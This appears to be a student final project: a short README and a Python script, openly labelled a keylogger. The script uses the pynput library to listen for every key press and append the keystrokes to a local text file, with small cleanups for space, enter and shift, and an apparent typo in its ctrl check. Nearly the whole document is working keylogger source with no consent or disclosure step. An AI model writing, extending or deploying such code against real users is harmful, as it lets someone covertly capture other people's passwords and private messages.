# FinalProject
this is a python project for a keylogger
# In order to use this library I had to go to File/settings/Project/Python interpreter and this library.
from pynput.keyboard import Listener


def log_to_file(stroke):  # This function is created to opened and collect the input of the keystrokes
    key = str(stroke)
    key = key.replace("'", "")  # the reason to use this command is to eliminate the single quotes.
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift':
        key = ''
    if key == 'Key.ctrl1':
        key = ""
    if key == 'Key.enter':
        key = "\n"
    with open("KeyStrokes.txt", 'a') as f:
        f.write(key)


with Listener(on_press=log_to_file) as l:  # this way the program is always listening
    l.join()
